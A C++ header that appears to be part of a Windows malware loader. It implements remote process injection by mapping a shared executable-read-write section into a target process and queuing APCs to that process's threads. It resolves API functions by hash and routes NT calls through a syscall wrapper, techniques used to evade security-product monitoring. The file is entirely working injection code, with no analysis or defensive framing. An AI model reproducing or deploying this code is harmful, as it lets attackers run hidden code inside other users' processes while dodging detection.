#pragma once
#include <Windows.h>
#include <inject.h>
#include <tlhelp32.h>
#include <intstructs.h>
#include <mem_ldr.h>
#include <hashtable.h>
#include <syslib.hpp>
#include <apidef.h>
extern syslib* psyslib;

PSECTION_ALLOC SectionAlloc(HANDLE handle, LONGLONG size, DWORD section_protection, DWORD page_protection, DWORD section_attr)
{
	HMODULE hModule = MemoryGetModuleHandle(WHASH_ntdll);
	HANDLE hSection = NULL;
	PSECTION_ALLOC secalloc = NULL;
	LARGE_INTEGER sectionSize = { size };
	LPVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
	SIZE_T dwViewSize = 0;
	NTSTATUS status = psyslib->nt_call(HASH_NtCreateSection, &hSection, section_protection, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, section_attr, 0);
	if (status == ERROR_SUCCESS)
	{
		status = psyslib->nt_call(HASH_NtMapViewOfSection, hSection, (HANDLE)(-1), &localSectionAddress, NULL, NULL, NULL, &dwViewSize, ViewShare, NULL, PAGE_READWRITE);
		if (status == ERROR_SUCCESS)
		{
			status = psyslib->nt_call(HASH_NtMapViewOfSection, hSection, handle, &remoteSectionAddress, 0, 0, NULL, &dwViewSize, ViewShare, NULL, page_protection);
			if (status == ERROR_SUCCESS)
			{
				secalloc = new SECTION_ALLOC;
				secalloc->localSection = (LONG64)localSectionAddress;
				secalloc->remoteSection = (LONG64)remoteSectionAddress;
			}
		}
	}
	SetLastError(status);
	return secalloc;
}


BOOL ProcessStartApcRoutine(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter) {
	HMODULE hkrnl32 = MemoryGetModuleHandle(WHASH_kernel32);
	pfnCreateToolhelp32Snapshot fnCreateToolhelp32Snapshot = (pfnCreateToolhelp32Snapshot)MemoryGetProcAddressP((PUCHAR)hkrnl32, HASH_CreateToolhelp32Snapshot);
	pfnThread32First fnThread32First = (pfnThread32First)MemoryGetProcAddressP((PUCHAR)hkrnl32, HASH_Thread32First);
	pfnThread32Next fnThread32Next = (pfnThread32Next)MemoryGetProcAddressP((PUCHAR)hkrnl32, HASH_Thread32Next);
	HANDLE hSnapshot = fnCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	
	// Check if snapshot creation failed or there are no threads in the process
	THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
	if (hSnapshot == INVALID_HANDLE_VALUE || hSnapshot == NULL || !fnThread32First(hSnapshot, &te32))
		return FALSE;

	DWORD pid = GetProcessId(hProcess);

	// Iterate through the threads in the snapshot
	do
	{
		// Check if the thread is in the process we want to inject into
		if (te32.th32OwnerProcessID != pid)
			continue;

		// Open the thread
		HANDLE hThread = 0;
		OBJECT_ATTRIBUTES oa;
		CLIENT_ID cid = {0, (HANDLE)te32.th32ThreadID };
		InitializeObjectAttributes(&oa, 0, 0, 0, 0);
		NTSTATUS status = psyslib->nt_call(HASH_NtOpenThread, &hThread, THREAD_SET_CONTEXT, &oa, &cid);
		if (hThread == NULL)
			continue;

		// Call the NtQueueApcThread function in the target process
		status = psyslib->nt_call(HASH_NtQueueApcThread, hThread, lpStartAddress, lpParameter, NULL, NULL);
		if (status != ERROR_SUCCESS)
		{
			SetLastError(status);
			return 0;
		}

		// Close the thread
		psyslib->nt_call_1arg(HASH_NtClose, hThread);
	} while (fnThread32Next(hSnapshot, &te32));
	
	psyslib->nt_call_1arg(HASH_NtClose, hSnapshot);
	return TRUE;
}